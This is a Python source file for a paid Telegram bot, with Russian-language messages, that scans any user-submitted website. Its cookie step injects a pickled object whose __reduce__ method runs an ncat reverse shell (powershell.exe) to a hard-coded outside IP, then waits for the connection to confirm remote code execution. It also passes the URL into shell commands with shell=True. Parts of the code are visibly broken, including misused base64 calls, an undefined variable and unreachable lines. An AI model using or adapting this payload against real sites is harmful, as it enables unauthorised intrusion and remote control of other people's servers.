# -*- coding: utf-8 -*-
import base64
import pickle
import random
import time

from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from payment import paygen, check
import socket
import asyncio
import concurrent.futures
from multiprocessing import Process, Queue
from config import *
from markups import *
from db import *
import json
import subprocess
from selenium import webdriver
from gpt import gpt
import random

driver = webdriver.Chrome(executable_path=EX_PATH)
bot = Bot(token=tkn)
dp = Dispatcher(bot)
re_port = 0
TP, L = dict(), dict()

def f(x):
    if (x == 1):
        return ""
    if (x == 3):
        return "а"
    return "ев"

class GNAT:
    def __reduce__(self):
        import os
        return (
            os.system, (
                f"ncat -e powershell.exe 46.56.185.245 {re_port}"
            )
        )

def send_py(msg):
    try:
        decoded = base64.decode(msg)
        obj = pickle.loads(decoded)
        return ser_obj
    except:
        return "-1"
def send_php(msg):
    global re_port
    data_to_send = json.dumps({
        'Sobj': msg,
        're_port': re_port
    })
    return "-1"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('127.0.0.1', in_port_php))
        s.sendall(data_to_send.encode())
        data = s.recv(ch).decode()
    return repr(data)
def monitoring():
    global re_port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', re_port))
    s.listen()
    print(f"{re_port} listening...")
    while True:
        conn, addr = s.accept()
        conn.close()
        return addr[0], addr[1]

async def launcher():
    loop = asyncio.get_event_loop()
    with concurrent.futures.ProcessPoolExecutor() as pool:
        try:
            ip, port = await asyncio.wait_for(loop.run_in_executor(pool, monitoring), timeout=30)
            return ip, port
        except asyncio.TimeoutError:
            return -1, -1

def GEN_CMD(cmd, url, ip):
    try:
        cmd = cmd.replace("^^^^", ip)
    except:
        pass

    try:
        cmd = cmd.replace("^^", url)
    except:
        pass

    return cmd

async def on_startup(_):
    print('bot online')

@dp.message_handler(commands=['start'])
async def start(msg : types.Message):
    if (is_user(msg.from_user.id) == 0):
        add_user(msg.from_user.id)
    if (get_exp(msg.from_user.id) < int(time.time())):
        await bot.send_message(msg.from_user.id, f"Здравствуйте, {msg.from_user.username}! Что-бы пользоваться ботом, вам нужно преобрести подписку.", parse_mode='html', reply_markup=subscribe_mrkp)
    else:
        tmp = await bot.send_message(msg.from_user.id, f"Здравствуйте, {msg.from_user.username}! Выберите конфигурацию сканеров для сканирования.\nДля начала сканирования просто отправьте ссылку на страницу", parse_mode='html', reply_markup=gen_chs(msg.from_user.id))
        L[msg.from_user.id] = tmp.message_id

@dp.callback_query_handler(text_contains='serv_')
async def serv(clb : types.CallbackQuery):
    s = clb.data
    s = s[5:]
    toggle_serv(clb.from_user.id, s)
    print(L[clb.from_user.id])
    await bot.edit_message_reply_markup(chat_id=clb.message.chat.id, message_id=L[clb.from_user.id], reply_markup=gen_chs(clb.from_user.id))

@dp.callback_query_handler(text_contains='mon')
async def subscr(clb: types.CallbackQuery):
    msg = clb.data
    msg = int(msg[3:])
    TP[clb.from_user.id] = msg
    link = paygen(msg, clb.from_user.id, clb.from_user.username)
    await bot.send_message(clb.from_user.id, f"Вы выбрали подписку на {msg} месяц{f(msg)}. Вот ваша ссылка для оплаты через CoinBase:\n\t{link}. После оплаты нажмите на кноку \"Проверить\"", parse_mode='html', reply_markup=check_mrkp)

@dp.callback_query_handler(text='chck')
async def chck(clb: types.CallbackQuery):
    if (check(clb.from_user.id) == "PAID"):
        topup(clb.from_user.id, TP[clb.from_user.id])
        await bot.send_message(clb.from_user.id, f"Успешное пополнение! Ваша подписка теперь действительна до {datetime.datetime.utcfromtimestamp(get_exp(clb.from_user.id))}.")
    else:
        await bot.send_message(clb.from_user.id, f"Средства еще не получены.")

@dp.message_handler()
async def scan(msg : types.Message):
    global re_port
    if (is_user(msg.from_user.id) == 0 or get_exp(msg.from_user.id) < int(time.time())):
        if (is_user(msg.from_user.id) == 0):
            add_user(msg.from_user.id)
        await bot.send_message(msg.from_user.id,
                               f"Здравствуйте, {msg.from_user.username}! Что-бы пользоваться ботом, вам нужно преобрести подписку.",
                               parse_mode='html', reply_markup=subscribe_mrkp)
    else:
        url = msg.text
        url = url.replace('https://', '')
        url = url.replace('http://', '')
        try:
            ip = socket.gethostbyname_ex(url)
        except:
            await bot.send_message(msg.from_user.id, f"Ссылка введенана некорректно")
            return
        url = 'http://' + url
        try:
            REPORT = ""
            lst = get_servs(msg.from_user.id)
            I = 0
            lst.append("Srlz")
            n = len(lst)
            for serv in lst:
                I += 1
                if (serv == "Srlz"):
                    try:
                        driver.get(url)
                        time.sleep(10)
                        cookies = driver.get_cookies()
                        for cookie in cookies:
                            ck = cookie['value']
                            re_port = random.randint(10000, 20000)
                            if (send_php(ck) != "-1" or send_py(ck) != "-1"):
                                obj = send_php(ck)
                                if (obj == "-1"):
                                    obj = base64.b64encode(pickle.dumps(GNAT()))
                                driver.delete_cookie(cookie['name'])
                                new_cookie = {'name': cookie['name'], 'value': obj}
                                driver.add_cookie(new_cookie)
                                driver.refresh()
                                port, ip = await launcher()
                                if (port != -1 and ip != -1):
                                    REPORT += f"\nInsecure de-serialization => RCE with reverse request in cookie on page {url}\n"
                    except:
                        pass
                    await bot.send_message(msg.from_user.id, f"Insecure de-serialization + RCE ({I}/{n})\t✓")
                else:
                    res = subprocess.run(GEN_CMD(CMS[serv], url, ip), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    REPORT += "\n" + res.stdout + "\n"
                    await bot.send_message(msg.from_user.id, serv + f" ({I}/{n})\t✓")
            await bot.send_message(msg.from_user.id, gpt(REPORT), parse_mode='html')
        except Exception as e:
            print(e)
            await bot.send_message(msg.from_user.id, f"Сканирование не удалось. Обратитесь в поддержку")

executor.start_polling(dp, skip_updates=True, on_startup=on_startup)